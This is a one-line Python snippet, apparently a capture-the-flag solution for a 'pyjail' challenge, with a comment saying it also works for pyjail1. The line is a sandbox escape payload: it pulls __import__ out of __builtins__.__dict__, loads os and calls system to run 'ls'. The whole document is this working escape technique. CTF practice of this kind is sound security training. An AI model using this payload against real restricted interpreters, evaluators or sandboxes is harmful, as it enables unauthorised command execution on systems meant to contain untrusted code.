# This also works for pyjail1
__builtins__.__dict__['__import__']('os').__dict__['system']('ls')